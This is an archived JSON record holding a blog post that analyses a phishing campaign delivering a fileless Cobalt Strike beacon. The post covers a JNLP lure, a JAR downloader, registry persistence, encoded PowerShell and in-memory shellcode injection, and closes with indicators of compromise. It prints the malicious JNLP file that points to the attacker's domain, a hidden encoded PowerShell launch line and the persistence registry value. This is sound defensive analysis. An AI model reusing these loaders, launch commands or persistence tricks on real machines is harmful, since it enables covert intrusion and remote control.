{
    "id": "479ee076-192b-4958-926e-73c692de3aec",
    "created_at": "2023-01-12T15:03:37.454541Z",
    "updated_at": "2025-03-27T02:09:17.910899Z",
    "deleted_at": null,
    "sha1_hash": "6b1d0878cc235c7425e26ce12ba0253b9329ee16",
    "title": "2020-07-22 - Analysing Fileless Malware- Cobalt Strike Beacon",
    "authors": "",
    "file_creation_date": "2022-05-28T17:30:31Z",
    "file_modification_date": "2022-05-28T17:30:31Z",
    "file_size": 863577,
    "plain_text": "# Analysing Fileless Malware: Cobalt Strike Beacon\n\n**[newtonpaul.com/analysing-fileless-malware-cobalt-strike-beacon/](https://newtonpaul.com/analysing-fileless-malware-cobalt-strike-beacon/)**\n\nPaul1 July 22, 2020\n\nToday we‚Äôre going to look at a malware campaign made up of multiple stages, with the end\ngoal of establishing a C2 connection to a Cobalt Strike server. There are a few cool\ntechniques that this campaign uses that we‚Äôre going to look at. I happened to come across\nthe initial first stage phishing attachment while browsing for samples on VirusTotal and found\nit interesting as you do not commonly see JNLP attachments used for phishing. So, let‚Äôs get\nstarted.\n\n## Stage 1: Attachment Analysis\n\nA JNLP file is a java web file, which when clicked, the application javaws.exe will attempt to\nload and execute the file. Javaws.exe is an application that is part of the Java Runtime\nEnvironment and is used to give internet functionality to java applications. JNLP files can be\nused to allow for applications hosted on a remote server to be launched locally. It is worth\nnoting that to be susceptible to phishing via a JNLP the user will have to have java installed\non their machine.\n\nThey are generally quite simple and are not difficult to analyse. You can easily view the\ncontent of a JNLP file by changing the extension to XML and loading the file in a text editor\nlike notepad++. As shown in the XML code below, we can see that this JNLP file will be used\nto load and execute the JAR file `FedEx_Delivery_invoice.jar` from the domain\n\n\n-----\n\n```\n<?xml version 1.0 encoding utf 8 ?>\n<jnlpspec=\"1.0+\"codebase=\"http://fedex-tracking.fun\"\nhref=\"FedEx_Delivery_invoice.jnlp\">\n<information>\n     <title>Federal Express Service</title>\n     <vendor>Federal Express</vendor>\n     <homepagehref=\"www.fedex.com\"/>\n     <description>Federal Express documents online.</description>\n          </information>\n     <security>\n          <all-permissions/>\n     </security>\n     <resources>\n          <j2seversion=\"1.6+\"/>\n          <jarhref=\"FedEx_Delivery_invoice.jar\"/>\n     </resources>\n          <application-descmain-class=\"FedEx_Service\">\n     </application-desc>\n</jnlp>\n\n```\nAs we know the name and location of the 2nd stage payload, we can try and download it.\nThe domain `hxxp://fedex-tracking.fun is still up, so we can download the`\n```\nFedEx_Delivery_invoice.jar file from here. Once we have the file, we will analyse it\n\n```\nwith JD-GUI. JD-GUI is a simple tool that allows you to decompile and view the code of JAR\nfiles. (I copied the code into Atom after opening with JD-GUI as I like the syntax highlighting\n_there.)_\n\n\n-----\n\n```\nFedEx_Delivery_invoice.jar\n\n```\n\n-----\n\nAs the code snippet above shows, the FedEx_Delivery_invoice.jarfile is going to attempt to\ndownload the file `fedex912.exe from the domain hxxp://fedex-tracking[.]press .`\nThe executable will be placed into the Windows temp directory, where it will then be\nexecuted. The JAR file will also load the legitimate FedEx tracking website which is most\nlikely to try and reassure the user that the file they have downloaded is a legitimate one.\n\n## Executable Analysis: Stage 2\n\nUnfortunately, at the time of writing, the domain hosting the `fedex912.exe is no longer`\nactive meaning we cannot download the file from here. However, there is a sample on Virus\nTotal that we can download. I ran the executable in my analysis environment with process\nmonitor and regshot and there were a few things of note. Firstly, the file `fedex912.exe`\ndrops a new file called `gennt.exe, which is basically just a copy of itself, into the directory`\n```\nC:\\ProgramData\\9ea94915b24a4616f72c\\ . The reason for placing the file here is that it is\n\n```\na hidden directory and not normally visible to the user. It then deletes the `fedex912.exe`\nfile from the filesystem.\n\nI used RegShot to take a before and after snapshot of the registry to compare the two after\nrunning the executable. The entry below shows the malware‚Äôs persistence mechanism.\nAdding the `gennt.exe executable to the registry key here ensures that the malware is`\nstarted every time Windows is restarted.\n```\nHKU\\S-1-5-21-1245055219-2462972176-1415829347-1001\\Software\\Microsoft\\Windows\nNT\\CurrentVersion\\Winlogon\\Shell:\"explorer.exe,\n\"C:\\ProgramData\\9ea94915b24a4616f72c\\gennt.exe\"\"\n\n```\nAfter doing some additional research on the executable, I found that it is supposed to launch\ncmd which then launches PowerShell. However, that did not occur on my test machine when\nrunning the executable. There could be a few reasons for this, one could be that the malware\nhas anti-analysis capabilities and knows when it is being run in a standard VM. As my lab is\nnot currently set up to counter VM aware malware, we are going to cheat slightly and use\ndata from a sample that was run on AnyRun.\n\nOn the AnyRun analysis, we can see that cmd did launch\n\n```\n\"C:\\Windows\\System32\\cmd.exe\" /c powershell -nop -w hidden \n```\n```\nencodedcommand‚Äù where a Base64 command was parsed to PowerShell. AnyRun records\n\n```\n[the command line, so let‚Äôs have a look into this. You can see the AnyRun anlysis here.](https://app.any.run/tasks/26f5199f-196c-4531-a6d6-adb2177ff690/)\n\n## PowerShell Analysis: Stage 3\n\nAs is usually the case, the command line was encoded with Base64 so I used CyberChef to\ndecode the text. Often when you decode Base64 text there will be a ‚Äú.‚Äù between every single\ncharacter This is annoying but can easily be fixed by also adding a decode text operator to\n\n\n-----\n\nthe recipe and setting the value to UTF-16LE(1200).\n\n\n-----\n\n-----\n\nWe can see that the command is further encoded with Base64, and if we scroll further down\nto the bottom, we can also see that it has been compressed with GunZip.\n\nI used CyberChef to once again decode the Base64 and to decompress the GunZip\nCompression.\n\nAfter running the above CyberChef recipe there was finally some human-readable text.\nThere‚Äôs a lot of interesting stuff happening here. So we essentially have three parts to the\nPowerShell script, there‚Äôs the first chunk with a couple of functions. The middle section with a\nBase64 Encoded block and a ‚Äúfor‚Äù statement. And then there‚Äôs the final section with some\ndefined variables and an ‚Äúif‚Äù statement. We‚Äôll tackle the Base64 Encoded block first and look\nat the rest of the PowerShell script a little later.\n\n**NOTE: I had to split the code screenshots into two, as there is too much code to fit into one**\nimage. I‚Äôd much rather just post the raw code, rather than screenshots, but that would result\nin my site being flagged for hosting malware üòÇ. You can download the code samples at the\nbottom of this post.\n\n\n-----\n\nPowershell Script part 1\n\n\n-----\n\nPowershell Script part 2\nOne thing that immediately stands out is a ‚Äúfor‚Äù statement underneath the Base64 encoded\ntext in the ‚ÄúPowershell Script part 2‚Äù image.\n\nThe ‚Äúfor‚Äù statement suggests that the Base64 block is encrypted with xor with a key of 35.\nWe can also use CyberChef to decrypt this.\n\n\n-----\n\nDecoded ShellCode\nAs shown in the above output, a lot of it is not human-readable but we can see what looks\nlike an IP address and information about a User-Agent. The rest of the code that we cannot\nunderstand looks to be shellcode. Let us try and do some basic shellcode analysis to see\nwhat is going on here.\n\nI used CyberChef to convert the code above into Hex. This is straight forward to do, and only\nrequires an additional two operators to our current CyberChef recipe. One operator converts\nour code into Hex, and the other is a find and replace to remove the spacing.\n\n\n-----\n\n-----\n\n-----\n\nShellCode\nOnce we have our Hex code, you can save the output as a .dat file. Next, I used the tool\n[scdbg to analyse the shellcode. This tool emulates basic Windows behaviour and can](http://sandsprite.com/blogs/index.php?uid=7&pid=152)\nintercept what Windows API calls the shellcode is requesting by emulating the Windows API\nenvironment.\n\nAfter parsing the .dat file to the tool, the output below is given. The shellcode loads the\nwininet API library and imports two functions which are used to establish an internet\nconnection. We can see that the connection is established to the IP address we saw earlier\nover port 8080.\n\nAs the shellcode does not import any other functions, it would appear that this is a simple\nbeacon program that establishes a remote connection to the malicious IP. Additional\ncommands are likely to be sent from the C2 server. The C2 IP address is a Ukrainian\naddress, with ports 80, 8080 and 22 open.\n\n### Injecting into memory with PowerShell\n\nSo we‚Äôve looked at our Base64 encoded block and determined that it‚Äôs some simple\nshellcode which is used to establish a connection to the C2 server. The one question we still\nhave to answer is how is the shellcode executed? From looking at the rest of the PowerShell\n\n\n-----\n\nscript, we can see that the shellcode is injected directly into memory. Below gives a basic\nsummary of how it does this.\n\n1. First the script imports two functions GetModuleHandle and GetProcAddress from\n\nsystem.dll, and it does this by importing them directly from memory, so it does not load\nthe DLL from disk. These are both Windows UnsafeNativeMethods. This method of\nloading DLLs in this way is called Run-Time Dynamic Linking, and you can read more\non it [here.](https://docs.microsoft.com/en-us/windows/win32/dlls/using-run-time-dynamic-linking)\n2. These functions are then used to allocate space in memory for the function ‚Äúvar_va‚Äù\n\nwhich is the function which contains our shellcode.\n3. Then the script decodes and decrypts the shellcode, in the same way that we did\n\nearlier with CyberChef\n4. Next, the VirtualAlloc writes the shellcode function to space in memory for the calling\n\nprocess. In this case, that would be PowerShell. So, the shellcode is essentially\ninjected into the memory space used by PowerShell.\n5. And finally, the shellcode is then executed, where it establishes a C2 channel with the\n\nCobalt Strike server.\n\n## What is Coablt Strike?\n\nAnyRun attributed the PowerShell activity to Cobalt Strike and the PowerShell script and the\nshellcode that we analysed matches the profile and behaviour of a Cobalt Strike Beacon.\nCobalt Strike is a tool used for adversary simulations and red team operations. A key feature\nof the tool is being able to generate malware payloads and C2 channels. The Cobalt Strike\nBeacon that we saw is fileless, meaning that the PowerShell script injects the Beacon\nstraight into memory and never touches disk. Once a Cobalt Strike Beacon is present on a\ndevice, the attacker has significant capability to perform additional actions including stealing\ntokens and credentials for lateral movement.\n\n## Conclusion\n\nSo that brings this post to an end. I hope you found the information here useful. It‚Äôs a simple\nexample of fileless malware and I think a good introduction for those who are maybe not very\nfamiliar with the area. It‚Äôs certainly a topic that I‚Äôm interested and something I want to\nresearch further, so expect more posts on this in the future!\n\n### IOCs\n\n**First stage:**\n\nFedEx_Delivery_invoice.jnlp\n\nSHA256:\n7d187c34512571b45ffc2285414425b2e8963a914765582f9ea76ecc2791b45e\nhxxp://fedex-tracking[ ]fun\n\n\n-----\n\n**Second stage:**\n\nFedEx_Delivery_invoice.jar\n\nSHA256:\ne3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\nhxxp://fedex-tracking[.]press\n\n**Third stage:**\n\nfedex912.exe / gennt.exe\n\nSHA256:\nba5fa7cc1a918b866354f4a5d9d92ceb3965ff81eb96e1608f190bccf12d38e6\nRun Location:\n\n%PROGRAMDATA%\\9ea94915b24a4616f72c\\gennt.exe\nPersistence Registry Key:\n\nHKU\\S-1-5-21-1245055219-246297217614158293471001\\Software\\Microsoft\\Windows\nNT\\CurrentVersion\\Winlogon\\Shell: ‚Äúexplorer.exe,\n‚ÄúC:\\ProgramData\\9ea94915b24a4616f72c\\gennt.exe\n\n**C2 Stage:**\n\n176[.]103[.]56[.]89\n\n## Resources\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-07-22 - Analysing Fileless Malware- Cobalt Strike Beacon.pdf"
    ],
    "report_names": [
        "2020-07-22 - Analysing Fileless Malware- Cobalt Strike Beacon.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535817,
    "ts_updated_at": 1743041357,
    "ts_creation_date": 1653759031,
    "ts_modification_date": 1653759031,
    "files": {
        "pdf": "https://archive.orkl.eu/6b1d0878cc235c7425e26ce12ba0253b9329ee16.pdf",
        "text": "https://archive.orkl.eu/6b1d0878cc235c7425e26ce12ba0253b9329ee16.txt",
        "img": "https://archive.orkl.eu/6b1d0878cc235c7425e26ce12ba0253b9329ee16.jpg"
    }
}